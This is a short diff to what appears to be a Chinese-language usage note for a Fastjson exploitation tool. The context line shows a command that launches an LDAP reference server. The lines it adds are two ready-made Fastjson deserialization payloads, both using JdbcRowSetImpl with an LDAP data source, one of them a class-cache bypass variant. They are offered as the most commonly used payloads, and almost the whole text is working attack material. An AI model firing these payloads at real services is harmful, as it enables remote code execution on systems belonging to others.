@@ -89,6 +89,13 @@ java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
 
 查询执行结果
 
+
+=======================================================
+最常用的2个如下：
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}
+
+{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}}
+
 ```
 
 
